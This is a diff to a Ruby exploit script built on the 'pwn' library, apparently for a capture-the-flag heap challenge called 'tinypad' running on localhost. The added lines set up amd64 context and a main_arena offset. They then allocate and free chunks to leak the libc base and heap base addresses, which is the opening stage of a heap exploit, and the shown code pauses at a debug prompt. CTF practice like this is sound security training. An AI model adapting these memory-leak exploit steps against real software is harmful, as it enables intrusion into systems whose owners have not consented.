@@ -2,6 +2,9 @@
 
 require 'pwn'
 
+context.log_level=:info
+context.arch="amd64"
+
 remote = ARGV[0] == "r"
 
 if remote 
@@ -15,6 +18,9 @@ if remote
 else
 	host = "localhost"
 	port = 54321
+	libc_offset = {
+		"main_arena" => 0x3c4b78
+	}
 end
 
 class MyTube < Sock
@@ -57,16 +63,30 @@ def edit_memo(index, content)
 end
 
 #z=MyTube.new "localhost", 54321
-MyTube.new("localhost", 54321) do |z|
-puts "Starting..."
+z=MyTube.new("localhost", 54321)
 @tube=z
+puts "Starting..."
 pid=`pidof tinypad`.split.first
+alloc(256,"A"*8)
+alloc(256,"B"*8)
+alloc(256,"C"*8)
+alloc(256,"D"*8)
+
+free(3)
+
+log.info "Leaking libc base..."
+gargage=z.recvuntil("INDEX: 3\n")
+libc_base=u64(z.recvline.strip[-6..-1].ljust(8,"\x00")) - libc_offset["main_arena"]
+log.info "Libc: 0x%08x" % [libc_base]
+
+log.info "Leaking heap base..."
+free(1)
+garbage=z.recvuntil("INDEX: 1\n")
+heap_base=u64(z.recvline.strip[-3..-1].ljust(8,"\x00")) - 0x220
+log.info "Heap: 0x%08x" % [heap_base]
+
 puts "[DEBUG] %s Continue?" % [pid]
 gets
-alloc(12,"A"*12)
-data=z.recvuntil("(CMD)>>> ")
-puts data
-
 #z.sendlineafter("(CMD)>>> ", "A")
 #z.sendlineafter("(SIZE)>>> ", "12")
 #z.sendlineafter("(CONTENT)>>> ", "A"*12)
@@ -77,4 +97,3 @@ puts data
 #
 #data=z.recvuntil("(CMD)>>> ")
 #puts data
-end
